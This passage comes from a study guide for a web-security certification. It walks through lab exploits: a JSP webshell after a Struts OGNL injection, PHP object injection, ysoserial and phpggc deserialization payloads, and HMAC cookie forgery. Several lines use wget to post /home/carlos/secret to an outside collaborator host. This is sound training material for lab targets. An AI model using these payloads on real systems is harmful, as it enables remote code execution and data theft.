\u003cspan class=\"pl-k\"\u003e!=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003enull\u003c/span\u003e ) {\u003c/span\u003e\n\u003cspan class=\"pl-s1\"\u003e                out\u003cspan class=\"pl-k\"\u003e.\u003c/span\u003eprintln(disr); \u003c/span\u003e\n\u003cspan class=\"pl-s1\"\u003e                disr \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e dis\u003cspan class=\"pl-k\"\u003e.\u003c/span\u003ereadLine(); \u003c/span\u003e\n\u003cspan class=\"pl-s1\"\u003e                }\u003c/span\u003e\n\u003cspan class=\"pl-s1\"\u003e        }\u003c/span\u003e\n\u003cspan class=\"pl-s1\"\u003e\u003c/span\u003e\u003cspan class=\"pl-pse\"\u003e\u003cspan class=\"pl-s1\"\u003e%\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u0026lt;/\u003cspan class=\"pl-ent\"\u003epre\u003c/span\u003e\u0026gt;\n\u0026lt;/\u003cspan class=\"pl-ent\"\u003eBODY\u003c/span\u003e\u0026gt;\u0026lt;/\u003cspan class=\"pl-ent\"\u003eHTML\u003c/span\u003e\u0026gt;\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003etarget only accepts a single valid image file since it performs MIME checks:\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/CVE-2024-53677-part1.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/CVE-2024-53677-part1.png\" alt=\"CVE-2024-53677 part1\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eBy OGNL injection, rewrite file to code shell.jsp and place in rout of web application.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/CVE-2024-53677-part2.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/CVE-2024-53677-part2.png\" alt=\"CVE-2024-53677 part 2\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eRCE Execution achived \u003ccode\u003ehttp://strutted.htb/webshell.jsp?cmd=id\u003c/code\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003chr\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eDeserialization\u003c/h2\u003e\u003ca id=\"user-content-deserialization\" class=\"anchor\" aria-label=\"Permalink: Deserialization\" href=\"#deserialization\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"#customtemplate-php\"\u003eCustomTemplate PHP\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#burp-deserialization-scanner\"\u003eBurp Deserialization Scanner\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#ysoserial\"\u003eYsoSerial\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#sha1-hmac-symfony\"\u003eSHA1 HMAC Symfony\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eCustomTemplate PHP\u003c/h3\u003e\u003ca id=\"user-content-customtemplate-php\" class=\"anchor\" aria-label=\"Permalink: CustomTemplate PHP\" href=\"#customtemplate-php\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eReading page \u003ccode\u003esource code\u003c/code\u003e and noticing comment mentioning \u003cstrong\u003e\u003c/strong\u003e, this \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e possible PHP framework and the Burp scanner \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e serialized session cookie object after we logged in with stolen \u003ccode\u003ewiener:peter\u003c/code\u003e credentials.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/info-disclose.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/info-disclose.png\" alt=\"info-disclose\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eReviewing PHP \u003ccode\u003esource code\u003c/code\u003e by adding tilde \u003cem\u003e\u003cstrong\u003e~\u003c/strong\u003e\u003c/em\u003e character at end of GET request \u003ccode\u003ehttps://target.net/libs/CustomTemplate.php~\u003c/code\u003e, we notice the \u003cstrong\u003edestruct\u003c/strong\u003e method.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/comments-in-source-code.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/comments-in-source-code.png\" alt=\"comments-in-source-code\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eOriginal Decoded cookie\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"O:4:\u0026quot;User\u0026quot;:2:{s:8:\u0026quot;username\u0026quot;;s:6:\u0026quot;wiener\u0026quot;;s:12:\u0026quot;access_token\u0026quot;;s:32:\u0026quot;bi0egmdu49lnl9h2gxoj3at4sh3ifh9x\u0026quot;;}\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003eO:4:\"User\":2:{s:8:\"username\";s:6:\"wiener\";s:12:\"access_token\";s:32:\"bi0egmdu49lnl9h2gxoj3at4sh3ifh9x\";}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eMake new PHP serial CustomTemplate object with the \u003cstrong\u003elock_file_path\u003c/strong\u003e attribute set to \u003cstrong\u003e/home/carlos/morale.txt\u003c/strong\u003e. Make sure to use the correct data type labels and length indicators. The 's' indicate string and the length.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"O:14:\u0026quot;CustomTemplate\u0026quot;:1:{s:14:\u0026quot;lock_file_path\u0026quot;;s:23:\u0026quot;/home/carlos/morale.txt\u0026quot;;}\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003eO:14:\"CustomTemplate\":1:{s:14:\"lock_file_path\";s:23:\"/home/carlos/morale.txt\";}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/modify-serial-cookie.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/modify-serial-cookie.png\" alt=\"modify-serial-cookie\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php\" rel=\"nofollow\"\u003ePortSwigger Lab: Arbitrary object injection in PHP\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eBurp Deserialization Scanner\u003c/h3\u003e\u003ca id=\"user-content-burp-deserialization-scanner\" class=\"anchor\" aria-label=\"Permalink: Burp Deserialization Scanner\" href=\"#burp-deserialization-scanner\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eIntercept the admin panel page in the Burp Practice Exam, and \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e the serial value of the cookie named \u003ccode\u003eadmin-prefs\u003c/code\u003e. This challenge is from the \u003ca href=\"https://portswigger.net/web-security/certification/takepracticeexam/index.html\" rel=\"nofollow\"\u003ePortSwigger Practice Exam APP\u003c/a\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/admin-prefs-serial-cookie.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/admin-prefs-serial-cookie.png\" alt=\"Admin prefs serial cookie\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eUse below payload in the Deserialization scanner exploiting Java jar ysoserial command, to obtain remote code execution (RCE) when payload de-serialized on target.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"CommonsCollections3 'wget http://OASTIFY.COM --post-file=/home/carlos/secret'\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003eCommonsCollections3 'wget http://OASTIFY.COM --post-file=/home/carlos/secret'\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eImage below is from the Practice exam, I have some issues with my setup as the old version of java is needed when running \u003ccode\u003eysoserial\u003c/code\u003e in bash terminal, and the Burp Suite Pro app need \u003ccode\u003esudo\u003c/code\u003e to save the config of the extension.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/ysoserial-rce.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/ysoserial-rce.png\" alt=\"ysoserial rce\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eBurp Deserialization Scanner configuration when running burp as sudo, leaving the java path to \u003ccode\u003ejava\u003c/code\u003e and the ysoserial path to ``. My scanner detect the java deserialization in the burp issue list but not when i run it manual???\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/Deserialization-scanner-config.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/Deserialization-scanner-config.png\" alt=\"Deserialization scanner config setup\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eYsoSerial\u003c/h3\u003e\u003ca id=\"user-content-ysoserial\" class=\"anchor\" aria-label=\"Permalink: YsoSerial\" href=\"#ysoserial\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eBelow is ysoserial command line execution to generate base64 encoded serialized cookie object containing payload.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eIMPORTANT:\u003c/strong\u003e If you get error message when executing \u003ccode\u003ejava -jar ysoserial \u0026lt;Payload\u0026gt;\u003c/code\u003e saying something in lines of \u003cem\u003e\u003cstrong\u003ejava.lang.IllegalAccessError: class ysoserial.payloads.util.Gadgets\u003c/strong\u003e\u003c/em\u003e, the switch to alternative Java on Linux with following commands.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"java --version\nupdate-java-alternatives --list\nsudo update-java-alternatives --set /usr/lib/jvm/java-1.11.0-openjdk-amd64\njava --version\"\u003e\u003cpre\u003ejava --version\nupdate-java-alternatives --list\nsudo update-java-alternatives --set /usr/lib/jvm/java-1.11.0-openjdk-amd64\njava --version\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/switch-java-version.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/switch-java-version.png\" alt=\"Switch Java version\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eNow execute \u003ccode\u003eysoserial\u003c/code\u003e to generate base64 payload, using Java version 11. Replace session cookie with generated base64 payload and URL encode only the key characters before sending request.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"java -jar /opt/ysoserial/ysoserial.jar CommonsCollections4 'wget http://OASTIFY.COM --post-file=/home/carlos/secret' | base64 -w 0\"\u003e\u003cpre\u003ejava -jar /opt/ysoserial/ysoserial.jar CommonsCollections4 \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003ewget http://OASTIFY.COM --post-file=/home/carlos/secret\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e base64 -w 0\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/ysoserial-command.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/ysoserial-command.png\" alt=\"ysoserial Command\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons\" rel=\"nofollow\"\u003ePortSwigger Lab: Exploiting Java deserialization with Apache Commons\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eSHA1 HMAC Symfony\u003c/h3\u003e\u003ca id=\"user-content-sha1-hmac-symfony\" class=\"anchor\" aria-label=\"Permalink: SHA1 HMAC Symfony\" href=\"#sha1-hmac-symfony\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003cem\u003e\u003cstrong\u003eIdentify\u003c/strong\u003e\u003c/em\u003e that the cookie contains a Base64-encoded token, signed with a SHA-1 HMAC hash. On the home page we discover a developer comment to debug info for \u003ccode\u003e/cgi-bin/phpinfo.php\u003c/code\u003e, revealing the digital signature to sign new token. Sending invalid cookie session value the error reveals, \u003ccode\u003eSymfony Version: 4.3.6\u003c/code\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eNote:\u003c/strong\u003e In BSCP exam not going to run this as it delete the file, but in exam read \u003ccode\u003esource code\u003c/code\u003e to \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e the \u003ccode\u003eunserialize()\u003c/code\u003e PHP function and extract content out-of-band using \u003ccode\u003ePHPGGC\u003c/code\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eExploit steps to perform a PHP deserialization with a pre-built gadget chain.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003col dir=\"auto\"\u003e\n\u003cli\u003eRequest the \u003ccode\u003e/cgi-bin/phpinfo.php\u003c/code\u003e file to find the leaked \u003ccode\u003eSECRET_KEY\u003c/code\u003e information about the website.\u003c/li\u003e\n\u003cli\u003eGenerate a Base64-encoded serialized object that exploits an RCE gadget chain in Symfony \u003ccode\u003ephpggc Symfony/RCE4 exec 'wget http://OASTIFY.COM --post-file=/home/carlos/secret' | base64 -w 0\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eConstruct a valid cookie containing this malicious object and sign it correctly using the secret key you obtained.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight highlight-text-html-php notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;?php\n$object = \u0026quot;OBJECT-GENERATED-BY-PHPGGC\u0026quot;;\n$secretKey = \u0026quot;LEAKED-SECRET-KEY-FROM-PHPINFO.PHP\u0026quot;;\n$cookie = urlencode('{\u0026quot;token\u0026quot;:\u0026quot;' . $object . '\u0026quot;,\u0026quot;sig_hmac_sha1\u0026quot;:\u0026quot;' . hash_hmac('sha1', $object, $secretKey) . '\u0026quot;}');\necho $cookie;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-ent\"\u003e\u0026lt;?php\u003c/span\u003e\n\u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-c1\"\u003e$\u003c/span\u003eobject\u003c/span\u003e = \u003cspan class=\"pl-s\"\u003e\"\u003cspan class=\"pl-s\"\u003eOBJECT-GENERATED-BY-PHPGGC\u003c/span\u003e\"\u003c/span\u003e;\n\u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-c1\"\u003e$\u003c/span\u003esecretKey\u003c/span\u003e = \u003cspan class=\"pl-s\"\u003e\"\u003cspan class=\"pl-s\"\u003eLEAKED-SECRET-KEY-FROM-PHPINFO.PHP\u003c/span\u003e\"\u003c/span\u003e;\n\u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-c1\"\u003e$\u003c/span\u003ecookie\u003c/span\u003e = \u003cspan class=\"pl-en\"\u003eurlencode\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003e'\u003cspan class=\"pl-s\"\u003e{\"token\":\"\u003c/span\u003e'\u003c/span\u003e . \u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-c1\"\u003e$\u003c/span\u003eobject\u003c/span\u003e . \u003cspan class=\"pl-s\"\u003e'\u003cspan class=\"pl-s\"\u003e\",\"sig_hmac_sha1\":\"\u003c/span\u003e'\u003c/span\u003e . \u003cspan class=\"pl-en\"\u003ehash_hmac\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003e'\u003cspan class=\"pl-s\"\u003esha1\u003c/span\u003e'\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-c1\"\u003e$\u003c/span\u003eobject\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-c1\"\u003e$\u003c/span\u003esecretKey\u003c/span\u003e) . \u003cspan class=\"pl-s\"\u003e'\u003cspan class=\"pl-s\"\u003e\"}\u003c/span\u003e'\u003c/span\u003e);\n\u003cspan class=\"pl-k\"\u003eecho\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-c1\"\u003e$\u003c/span\u003ecookie\u003c/span\u003e;\u003c/pre\u003e\u003c/div\u003e\n\u003col start=\"4\" dir=\"auto\"\u003e\n\u003cli\u003eExecute the php code in terminal, \u003ccode\u003ephp Symfony_insecure_deserial_php.php\u003c/code\u003e to obtain signed cookie.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/symphony-phpgcc.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/symphony-phpgcc.png\" alt=\"Symfony phpggc gadget deserial\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eReplace cookie value and send request to get remote code execution (RCE) when cookie is deserialised server side. Ignore the server response \u003ccode\u003eHTTP/2 500 Internal Server Error\u003c/code\u003e, check the collaborator if data was received.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain\" rel=\"nofollow\"\u003ePortSwigger Lab: Exploiting PHP deserialization with a pre-built gadget chain\u003c/a\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eOS Command Injection\u003c/h2\u003e\u003ca id=\"user-content-os-command-injection\" class=\"anchor\" aria-label=\"Permalink: OS Command Injection\" href=\"#os-command-injection\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003e\u003ca href=\"#feedback\"\u003eFeedback\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#output-redirection\"\u003eOutput redirection\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eFeedback\u003c/h3\u003e\u003ca id=\"user-content-feedback\" class=\"anchor\" aria-label=\"Permalink: Feedback\" href=\"#feedback\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 